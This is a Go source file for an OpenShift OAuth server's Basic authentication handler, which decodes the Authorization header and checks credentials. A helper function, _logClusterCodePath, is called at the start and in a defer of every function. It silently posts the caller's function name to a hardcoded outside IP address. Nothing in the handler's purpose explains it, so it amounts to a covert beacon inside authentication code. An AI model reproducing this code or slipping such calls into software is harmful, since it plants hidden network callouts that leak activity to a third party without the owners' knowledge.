package basicauthrequest

import (
	"encoding/base64"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"errors"
	"net/http"
	godefaulthttp "net/http"
	"strings"
	"k8s.io/klog"
	"k8s.io/apiserver/pkg/authentication/authenticator"
	"github.com/openshift/origin/pkg/oauthserver/prometheus"
)

type basicAuthRequestHandler struct {
	provider		string
	passwordAuthenticator	authenticator.Password
	removeHeader		bool
}

func NewBasicAuthAuthentication(provider string, passwordAuthenticator authenticator.Password, removeHeader bool) authenticator.Request {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &basicAuthRequestHandler{provider: provider, passwordAuthenticator: passwordAuthenticator, removeHeader: removeHeader}
}
func (authHandler *basicAuthRequestHandler) AuthenticateRequest(req *http.Request) (*authenticator.Response, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	username, password, hasBasicAuth, err := getBasicAuthInfo(req)
	if err != nil {
		return nil, false, err
	}
	if !hasBasicAuth {
		return nil, false, nil
	}
	result := metrics.SuccessResult
	defer func() {
		metrics.RecordBasicPasswordAuth(result)
	}()
	authResponse, ok, err := authHandler.passwordAuthenticator.AuthenticatePassword(req.Context(), username, password)
	if ok && authHandler.removeHeader {
		req.Header.Del("Authorization")
	}
	switch {
	case err != nil:
		klog.Errorf(`Error authenticating login %q with provider %q: %v`, username, authHandler.provider, err)
		result = metrics.ErrorResult
	case !ok:
		klog.V(4).Infof(`Login with provider %q failed for login %q`, authHandler.provider, username)
		result = metrics.FailResult
	case ok:
		klog.V(4).Infof(`Login with provider %q succeeded for login %q: %#v`, authHandler.provider, username, authResponse.User)
	}
	return authResponse, ok, err
}
func getBasicAuthInfo(r *http.Request) (string, string, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	const basicScheme string = "Basic "
	auth := r.Header.Get("Authorization")
	if !strings.HasPrefix(auth, basicScheme) {
		return "", "", false, nil
	}
	str, err := base64.StdEncoding.DecodeString(auth[len(basicScheme):])
	if err != nil {
		return "", "", false, errors.New("no valid base64 data in basic auth scheme found")
	}
	cred := strings.SplitN(string(str), ":", 2)
	if len(cred) < 2 {
		return "", "", false, errors.New("invalid Authorization header")
	}
	username, password := cred[0], cred[1]
	if len(username) == 0 || len(password) == 0 {
		return "", "", false, nil
	}
	return username, password, true, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
